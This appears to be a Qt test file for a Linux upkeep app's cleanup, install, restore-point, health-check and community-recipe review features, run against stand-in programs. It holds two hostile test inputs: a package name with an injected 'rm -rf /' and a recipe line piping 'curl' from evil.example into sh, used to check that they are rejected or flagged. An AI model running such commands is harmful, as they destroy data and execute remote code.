// SPDX-License-Identifier: GPL-2.0-or-later
//
// The upkeep cards past the Update card, read from what the computer's own
// programs print, and run with scripts of the test's own or with stand-ins for
// the system's programs on the PATH: nothing here looks at or changes this
// computer. Files are made and removed only inside the test's own home.
#include "app/AppInstall.h"
#include "app/CommunityApps.h"
#include "app/Conversation.h"
#include "app/HealthCheck.h"
#include "app/RestorePoints.h"
#include "app/SpaceCleanup.h"

#include <QDir>
#include <QFile>
#include <QProcess>
#include <QSettings>
#include <QSignalSpy>
#include <QTemporaryDir>
#include <QTest>
#include <QTimeZone>

using namespace splitrock;

namespace {

QString fixture(const QString &name)
{
    QFile file(QStringLiteral(FIXTURES_DIR "/chores/") + name);
    return file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
}

const QDateTime Now = QDateTime(QDate(2026, 10, 9), QTime(21, 0), QTimeZone::utc());

// A script that prints a fixture.
QString printing(const QString &name)
{
    return QStringLiteral("cat '" FIXTURES_DIR "/chores/") + name + QLatin1Char('\'');
}

bool write(const QString &path, const QString &text, bool executable = false)
{
    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile file(path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate))
        return false;
    file.write(text.toUtf8());
    file.close();
    if (executable)
        file.setPermissions(file.permissions() | QFileDevice::ExeOwner);
    return true;
}

// Stand-ins for the system's programs, first on the PATH while the test runs.
class StandIns
{
public:
    StandIns()
        : m_path(qEnvironmentVariable("PATH"))
    {
        qputenv("PATH", (m_dir.path() + QLatin1Char(':') + m_path).toLocal8Bit());
    }
    ~StandIns() { qputenv("PATH", m_path.toLocal8Bit()); }
    bool add(const QString &name, const QString &script)
    {
        return write(m_dir.filePath(name), QStringLiteral("#!/bin/sh\n") + script, true);
    }
    QString path() const { return m_dir.path(); }

private:
    QTemporaryDir m_dir;
    QString m_path;
};

bool git(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), QStringList{QStringLiteral("-c"), QStringLiteral("user.name=Test"), QStringLiteral("-c"),
                                               QStringLiteral("user.email=test@example.invalid"), QStringLiteral("-c"),
                                               QStringLiteral("init.defaultBranch=master")}
                                       + arguments);
    return p.waitForFinished(20000) && p.exitStatus() == QProcess::NormalExit && p.exitCode() == 0;
}

QString gitOut(const QString &dir, const QStringList &arguments)
{
    QProcess p;
    p.setWorkingDirectory(dir);
    p.start(QStringLiteral("git"), arguments);
    p.waitForFinished(20000);
    return QString::fromUtf8(p.readAllStandardOutput()).trimmed();
}

QString srcinfo(const QString &version)
{
    return QStringLiteral("pkgbase = demo\n\tpkgver = %1\n\tpkgrel = 1\n\tsource = https://example.org/demo-%1.tar.gz\n"
                          "pkgname = demo\n").arg(version);
}

} // namespace

class TestChores : public QObject
{
    Q_OBJECT

private Q_SLOTS:
    void initTestCase()
    {
        // Only ever the test's own home.
        QVERIFY(!qEnvironmentVariable("SPLIT_ROCK_TEST_HOME").isEmpty());
        QCOMPARE(QDir::homePath(), qEnvironmentVariable("SPLIT_ROCK_TEST_HOME"));
    }

    void sizesAreReadAndSaid()
    {
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("take up 1.5G in the file system.")), qint64(1.5 * 1024 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("412.5 MiB")), qint64(412.5 * 1024));
        QCOMPARE(SpaceCleanup::readSize(QStringLiteral("nothing")), qint64(-1));
        QCOMPARE(Chore::size(3 * 1024 * 1024 + 300 * 1024), QStringLiteral("3.3 GB"));
        QCOMPARE(Chore::size(500 * 1024), QStringLiteral("500 MB"));
    }

    void spaceListsLeftoversBiggestFirst()
    {
        const SpaceCleanup::Look look = SpaceCleanup::readLook(fixture(QStringLiteral("space-look.txt")));
        QCOMPARE(look.freeKb, qint64(48000000));
        QStringList ids;
        for (const SpaceCleanup::Item &item : look.items)
            ids.append(item.id);
        QCOMPARE(ids, (QStringList{QStringLiteral("pkgcache"), QStringLiteral("journal"), QStringLiteral("cache"),
                                   QStringLiteral("builds"), QStringLiteral("trash"), QStringLiteral("crashes"),
                                   QStringLiteral("orphans"), QStringLiteral("apps")}));
        const auto item = [&look](const QString &id) {
            return *std::find_if(look.items.cbegin(), look.items.cend(), [&id](const auto &i) { return i.id == id; });
        };
        QCOMPARE(item(QStringLiteral("pkgcache")).count, 47);
        // 200 MB of logs stay.
        QCOMPARE(item(QStringLiteral("journal")).kb, qint64(1.4 * 1024 * 1024) - 200 * 1024);
        // Parts nothing uses and the trash wait for the person to pick them.
        QVERIFY(!item(QStringLiteral("orphans")).chosen);
        QCOMPARE(item(QStringLiteral("orphans")).list, (QStringList{QStringLiteral("python-pip"), QStringLiteral("qt5-tools")}));
        QVERIFY(!item(QStringLiteral("trash")).chosen);
        QCOMPARE(item(QStringLiteral("trash")).count, 3);
        QCOMPARE(item(QStringLiteral("apps")).list,
                 (QStringList{QStringLiteral("org.kde.Platform"), QStringLiteral("org.freedesktop.Platform")}));
        QVERIFY(item(QStringLiteral("pkgcache")).admin);
        QVERIFY(!item(QStringLiteral("cache")).admin);

        // A name that isn't a package's is never offered.
        QString look2 = fixture(QStringLiteral("space-look.txt"));
        look2.replace(QStringLiteral("qt5-tools"), QStringLiteral("qt5-tools; rm -rf /"));
        const SpaceCleanup::Look odd = SpaceCleanup::readLook(look2);
        const auto orphans = std::find_if(odd.items.cbegin(), odd.items.cend(), [](const auto &i) { return i.id == QLatin1String("orphans"); });
        QCOMPARE(orphans->list, QStringList{QStringLiteral("python-pip")});
    }

    void spaceClearsWhatIsChosen()
    {
        // Old and new cache files in the test's own home.
        const QString cache = QDir::homePath() + QStringLiteral("/.cache");
        QVERIFY(write(cache + QStringLiteral("/someapp/old.bin"), QStringLiteral("old")));
        QVERIFY(write(cache + QStringLiteral("/someapp/new.bin"), QStringLiteral("new")));
        QVERIFY(write(cache + QStringLiteral("/paru/clone/demo/PKGBUILD"), QStringLiteral("x")));
        QVERIFY(QProcess::execute(QStringLiteral("touch"), {QStringLiteral("-a"), QStringLiteral("-d"), QStringLiteral("40 days ago"),
                                                           cache + QStringLiteral("/someapp/old.bin")}) == 0);

        SpaceCleanup space;
        space.setElevate({});
        space.setLookScript(printing(QStringLiteral("space-look.txt")));
        space.setAdminScript(QStringLiteral("for a in \"$@\"; do echo \"arg $a\"; done; echo '@@ step pkgcache'; "
                                            "echo split-rock-pre=7; echo 'split-rock-removed= python-pip'"));
        space.setFreeScript(QStringLiteral("echo 49048576"));
        QStringList written;
        space.setWriteDown([&written](const QString &id, const QString &title, const QString &undo, QString *) {
            written << id << title << undo;
            return true;
        });
        bool reported = false;
        space.setReport([&reported](const QString &, bool ok, const QString &, const QString &) { reported = ok; });

        space.check();
        QTRY_COMPARE(space.stage(), QStringLiteral("ready"));
        QVERIFY(space.needsPassword());
        // Only the person's own and the old copies; nothing of the real
        // computer's runs as the test.
        space.choose(QStringLiteral("journal"), false);
        space.choose(QStringLiteral("crashes"), false);
        space.choose(QStringLiteral("apps"), false);
        space.choose(QStringLiteral("orphans"), true);
        space.start();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        space.close();
        QCOMPARE(space.stage(), QStringLiteral("clearing"));
        QTRY_COMPARE(space.stage(), QStringLiteral("done"));
        QVERIFY(reported);
        QCOMPARE(space.freed(), QStringLiteral("1.0 GB"));
        QVERIFY(written.value(1).startsWith(QStringLiteral("Freed up space: ")));
        QVERIFY(written.value(2).contains(QStringLiteral("python-pip")));
        // The jobs, then the parts the person saw.
        QVERIFY(space.log().contains(QStringLiteral("arg 1\narg pkgcache\narg --\narg python-pip\narg qt5-tools")));
        // Unused for a month goes; the rest, and community build files kept
        // until chosen, stay.
        QVERIFY(!QFile::exists(cache + QStringLiteral("/someapp/old.bin")));
        QVERIFY(QFile::exists(cache + QStringLiteral("/someapp/new.bin")));
        QVERIFY(!QFile::exists(cache + QStringLiteral("/paru/clone")));
        QDir(cache).removeRecursively();
    }

    void installFindsAppsBestFirst()
    {
        const QList<AppInstall::App> apps = AppInstall::readSearch(fixture(QStringLiteral("install-search.txt")),
                                                                   QStringLiteral("pdf editor"));
        QStringList keys;
        for (const AppInstall::App &a : apps)
            keys.append(a.key);
        // The library is no app; Okular is on the shelf, so Flathub's copy
        // isn't listed again.
        QCOMPARE(keys, (QStringList{QStringLiteral("flathub:net.code_industry.MasterPDFEditor"), QStringLiteral("shelf:pdfarranger"),
                                    QStringLiteral("shelf:okular"), QStringLiteral("flathub:com.github.xournalpp.xournalpp")}));
        QVERIFY(apps.at(2).installed);
        QVERIFY(apps.at(2).alsoFlathub);
        QVERIFY(!apps.at(1).installed);
    }

    void installRunsThroughTheTransaction()
    {
        // The real transaction, with pacman stood in for.
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'Packages (1) pdfarranger-1.11-1'\necho 'installing pdfarranger...'\n"
            "echo ':: Running post-transaction hooks...'\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setLogFolder(logs.path());
        install.setSearchScript(printing(QStringLiteral("install-search.txt")));
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        install.search(QStringLiteral("pdf"));
        QCOMPARE(install.stage(), QStringLiteral("searching"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // One already installed isn't installed again.
        install.install(QStringLiteral("shelf:okular"));
        QCOMPARE(install.stage(), QStringLiteral("results"));
        install.install(QStringLiteral("shelf:pdfarranger"));
        QCOMPARE(install.stage(), QStringLiteral("installing"));
        QTRY_COMPARE(install.stage(), QStringLiteral("done"));
        QCOMPARE(title, QStringLiteral("Installed PDF Arranger"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- pdfarranger")));
        QVERIFY(install.pickedMap().value(QStringLiteral("installed")).toBool());
        QVERIFY(QFile::exists(logs.filePath(QStringLiteral("split-rock-install.log"))));
    }

    void restorePointsSayWhatCameNext()
    {
        const RestorePoints::Look look = RestorePoints::readLook(fixture(QStringLiteral("restore-look.txt")));
        QVERIFY(look.configured);
        QCOMPARE(look.menu, QStringLiteral("limine"));
        QCOMPARE(look.keepTool, QStringLiteral("btrfs-assistant-launcher"));
        QCOMPARE(look.bootedFrom, -1);
        QVERIFY(look.homeSeparate);
        // Pairs are one point; the one after is left out, newest first.
        QCOMPARE(look.points.size(), 3);
        QCOMPARE(look.points.at(0).number, 313);
        QCOMPARE(look.points.at(0).what, QStringLiteral("Before updating the computer"));
        QCOMPARE(look.points.at(1).what, QStringLiteral("Before installing okular"));
        QCOMPARE(look.points.at(2).kind, QStringLiteral("timeline"));

        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Rns qt5-tools python-pip"), QStringLiteral("number")),
                 QStringLiteral("Before removing qt5-tools, python-pip"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Syu"), QStringLiteral("number")),
                 QStringLiteral("Before updating the computer"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("Split Rock: Install okular"), QStringLiteral("number")),
                 QStringLiteral("Before installing okular"));

        // Started from one: the computer runs on its snapshot.
        QString booted = fixture(QStringLiteral("restore-look.txt"));
        booted.replace(QStringLiteral("rootflags=subvol=/@"), QStringLiteral("rootflags=subvol=/@/.snapshots/313/snapshot"));
        QCOMPARE(RestorePoints::readLook(booted).bootedFrom, 313);

        // Listing needs the password where the person may not.
        QCOMPARE(RestorePoints::readLook(QStringLiteral("@@ snapper\nyes\n@@ list\nNo permissions.\n@@ end\n")).denied, true);
    }

    void goingBackSaysWhereToTap()
    {
        RestorePoints restore;
        restore.setLookScript(printing(QStringLiteral("restore-look.txt")));
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        restore.choose(311);
        QCOMPARE(restore.stage(), QStringLiteral("chosen"));
        const QStringList steps = restore.steps();
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("open Snapshots")));
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("number 311")));
        restore.back();
        QCOMPARE(restore.stage(), QStringLiteral("ready"));
    }

    void theHealthCheckReadsEachPart()
    {
        const QList<HealthCheck::Item> items = HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now);
        QMap<QString, HealthCheck::Item> byId;
        for (const HealthCheck::Item &i : items)
            byId.insert(i.id, i);
        // A problem first.
        QCOMPARE(items.first().id, QStringLiteral("services"));
        QCOMPARE(byId.value(QStringLiteral("services")).state, QStringLiteral("bad"));
        QVERIFY(byId.value(QStringLiteral("services")).question.contains(QStringLiteral("bluetooth-autoconnect.service")));
        QCOMPARE(byId.value(QStringLiteral("space")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("space")).action, QStringLiteral("space"));
        QCOMPARE(byId.value(QStringLiteral("drive")).state, QStringLiteral("good"));
        QVERIFY(byId.value(QStringLiteral("battery")).detail.contains(QStringLiteral("86%")));
        QVERIFY(byId.value(QStringLiteral("battery")).detail.contains(QStringLiteral("312 charges")));
        QCOMPARE(byId.value(QStringLiteral("updates")).state, QStringLiteral("warn"));
        QCOMPARE(byId.value(QStringLiteral("updates")).action, QStringLiteral("update"));
        QCOMPARE(byId.value(QStringLiteral("restore")).state, QStringLiteral("good"));
        QCOMPARE(byId.value(QStringLiteral("settings")).state, QStringLiteral("warn"));
        QVERIFY(byId.value(QStringLiteral("crashes")).detail.contains(QStringLiteral("plasmashell (2)")));
        QCOMPARE(byId.value(QStringLiteral("pkgcache")).action, QStringLiteral("space"));

        // Without restore points, it says so.
        QString none = fixture(QStringLiteral("health-look.txt"));
        none.replace(QStringLiteral("@@ snapper\nyes\n"), QStringLiteral("@@ snapper\n"));
        const QList<HealthCheck::Item> without = HealthCheck::readLook(none, Now);
        QVERIFY(std::any_of(without.cbegin(), without.cend(), [](const auto &i) {
            return i.id == QLatin1String("restore") && i.state == QLatin1String("warn");
        }));
    }

    void theHealthCheckRunsQuietlyOnceAWeek()
    {
        QSettings(QStringLiteral("split-rock"), QStringLiteral("upkeep")).remove(QStringLiteral("health"));
        HealthCheck health;
        health.setLookScript(printing(QStringLiteral("health-look.txt")));
        health.checkIfDue();
        QTRY_VERIFY(!health.lastChecked().isEmpty());
        QVERIFY(health.attention() > 0);
        // Quietly: the card stays closed.
        QCOMPARE(health.stage(), QString());
        QCOMPARE(health.lastChecked(), QStringLiteral("Today"));
        // Not again within the week.
        HealthCheck again;
        again.setLookScript(QStringLiteral("exit 1"));
        again.checkIfDue();
        QVERIFY(!again.busy());
        // Asked for, it opens.
        health.check();
        QCOMPARE(health.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(health.stage(), QStringLiteral("done"));
    }

    void versionsCompareAsPacmanDoes()
    {
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.104.0-1"), QStringLiteral("1.105.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1:1.0-1"), QStringLiteral("2.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0a-1"), QStringLiteral("1.0-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-1"), QStringLiteral("1.0.1-1")) < 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.0-2"), QStringLiteral("1.0-1")) > 0);
        QVERIFY(CommunityApps::compareVersions(QStringLiteral("1.010-1"), QStringLiteral("1.9-1")) > 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("2.3.4-1"), QStringLiteral("2.3.4-1")), 0);
        QCOMPARE(CommunityApps::compareVersions(QStringLiteral("1.2"), QStringLiteral("1.2-3")), 0);
    }

    void communityAppsListWhatHasANewerRecipe()
    {
        const CommunityApps::Look look = CommunityApps::readLook(fixture(QStringLiteral("community-look.txt")));
        QVERIFY(look.reached);
        QCOMPARE(look.apps.size(), 1);
        QCOMPARE(look.apps.first().name, QStringLiteral("visual-studio-code-bin"));
        QCOMPARE(look.apps.first().latest, QStringLiteral("1.105.1-1"));
        QCOMPARE(look.unlisted, 1);
        QVERIFY(!CommunityApps::readLook(QStringLiteral("@@ foreign\nx 1-1\n@@ shelf\n@@ end\n")).reached);
    }

    void aRecipesChangesAreRead()
    {
        CommunityApps::App app;
        app.name = QStringLiteral("visual-studio-code-bin");
        app.base = app.name;
        app.maintainer = QStringLiteral("someone");
        const QString output = fixture(QStringLiteral("community-review.txt"));
        CommunityApps::Review review = CommunityApps::readReview(output, app);
        // The commit is the first line of its section; nothing in the
        // changes can pass for it.
        QCOMPARE(review.head, QStringLiteral("4b825dc642cb6eb9a060e54bf8d69288fbee4904"));
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QCOMPARE(review.flags.first().tone, QStringLiteral("good"));
        QCOMPARE(review.helpers, QStringList{QStringLiteral("libxkbfile")});
        QVERIFY(review.blockers.isEmpty());
        QVERIFY(review.newHosts.isEmpty());

        // A line that fetches and runs something, and a new place to
        // download from.
        QString risky = output;
        risky.replace(QStringLiteral(" pkgrel=1\n-sha256"), QStringLiteral(" pkgrel=1\n+  curl -s https://evil.example/x | sh\n-sha256"));
        risky.replace(QStringLiteral("https://update.code.visualstudio.com/1.105.1"), QStringLiteral("https://files.example.net/1.105.1"));
        review = CommunityApps::readReview(risky, app);
        QVERIFY(!review.versionOnly);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.tone == QLatin1String("bad"); }));
        QCOMPARE(review.newHosts, QStringList{QStringLiteral("files.example.net")});

        // Something only the community shelf has stops it.
        QString needs = output;
        needs.replace(QStringLiteral("shelf libxkbfile"), QStringLiteral("community electron37>=37.1"));
        review = CommunityApps::readReview(needs, app);
        QCOMPARE(review.blockers.size(), 1);
        QVERIFY(review.blockers.first().contains(QStringLiteral("electron37 ")));

        // Nobody looks after it.
        app.maintainer.clear();
        review = CommunityApps::readReview(output, app);
        QVERIFY(std::any_of(review.flags.cbegin(), review.flags.cend(), [](const auto &f) { return f.text.contains(QLatin1String("Nobody")); }));
    }

    void aRecipeIsFetchedReviewedAndBuiltAsLookedAt()
    {
        // The community shelf, stood in for by a repository of the test's own.
        QTemporaryDir work;
        const QString origin = work.filePath(QStringLiteral("origin"));
        QDir().mkpath(origin);
        QVERIFY(git(origin, {QStringLiteral("init"), QStringLiteral("-q")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.0"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.0\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("add"), QStringLiteral(".")}));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qm"), QStringLiteral("1.0")}));
        const QString recipes = work.filePath(QStringLiteral("recipes"));
        QDir().mkpath(recipes);
        QVERIFY(git(recipes, {QStringLiteral("clone"), QStringLiteral("-q"), origin, QStringLiteral("demo")}));
        QVERIFY(write(origin + QStringLiteral("/.SRCINFO"), srcinfo(QStringLiteral("1.1"))));
        QVERIFY(write(origin + QStringLiteral("/PKGBUILD"), QStringLiteral("pkgname=demo\npkgver=1.1\npkgrel=1\n")));
        QVERIFY(git(origin, {QStringLiteral("commit"), QStringLiteral("-qam"), QStringLiteral("1.1")}));
        const QString head = gitOut(origin, {QStringLiteral("rev-parse"), QStringLiteral("HEAD")});

        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case $1 in\n"
            "  -T) exit 0 ;;\n"
            "  -Qqp) echo demo ;;\n"
            "  *) echo \"pacman $*\" ;;\n"
            "esac\n")));
        QVERIFY(standIns.add(QStringLiteral("makepkg"), QStringLiteral(
            "if [ \"$1\" = --packagelist ]; then echo \"$PWD/demo-1.1-1-any.pkg.tar.zst\"; exit 0; fi\n"
            "echo \"==> Making package: demo $(sed -n 's/^pkgver=//p' PKGBUILD)\"\n"
            "touch demo-1.1-1-any.pkg.tar.zst\n")));
        QTemporaryDir logs;

        CommunityApps community;
        community.setElevate({});
        community.setLogFolder(logs.path());
        community.setRecipes(recipes);
        community.setLookScript(QStringLiteral(
            "printf '@@ foreign\\ndemo 1.0-1\\n@@ shelf\\n{\"results\":[{\"Name\":\"demo\",\"PackageBase\":\"demo\","
            "\"Version\":\"1.1-1\",\"Maintainer\":\"someone\"}]}\\n@@ end\\n'"));
        community.check();
        QTRY_COMPARE(community.stage(), QStringLiteral("ready"));
        community.look(QStringLiteral("demo"));
        QCOMPARE(community.stage(), QStringLiteral("reviewing"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("reviewed"), 20000);
        const CommunityApps::Review review = community.review();
        QCOMPARE(review.head, head);
        QVERIFY(!review.firstLook);
        QVERIFY(review.versionOnly);
        QVERIFY(review.diff.contains(QStringLiteral("+pkgver=1.1")));

        community.start();
        QCOMPARE(community.stage(), QStringLiteral("updating"));
        QTRY_COMPARE_WITH_TIMEOUT(community.stage(), QStringLiteral("done"), 20000);
        QVERIFY(community.log().contains(QStringLiteral("==> Making package: demo 1.1")));
        QVERIFY(community.log().contains(QStringLiteral("pacman -U --noconfirm --noprogressbar --color never")));
        QCOMPARE(gitOut(recipes + QStringLiteral("/demo"), {QStringLiteral("rev-parse"), QStringLiteral("HEAD")}), head);
        // Done, it leaves the list.
        QVERIFY(community.apps().isEmpty());
    }

    void aCardIsOpenedByName()
    {
        QString error;
        std::optional<ChangeProposal> asked = ChangeProposal::fromJson(R"({"title": "Free up space", "card": "space"})", &error);
        QVERIFY2(asked, qPrintable(error));
        QCOMPARE(asked->card, QStringLiteral("space"));
        QVERIFY(!ChangeProposal::fromJson(R"({"title": "x", "card": "dishes"})"));

        Conversation c({});
        c.spaceCleanup()->setLookScript(printing(QStringLiteral("space-look.txt")));
        c.healthCheck()->setLookScript(printing(QStringLiteral("health-look.txt")));
        c.propose(*asked);
        QCOMPARE(c.chore(), QStringLiteral("space"));
        QVERIFY(c.choreBusy());
        // Never two at once.
        QVERIFY(!c.openChore(QStringLiteral("health")));
        QTRY_COMPARE(c.spaceCleanup()->stage(), QStringLiteral("ready"));
        QVERIFY(c.openChore(QStringLiteral("health")));
        QCOMPARE(c.chore(), QStringLiteral("health"));
        QCOMPARE(c.spaceCleanup()->stage(), QString());
        QTRY_COMPARE(c.healthCheck()->stage(), QStringLiteral("done"));
    }
};

QTEST_MAIN(TestChores)
#include "test_chores.moc"
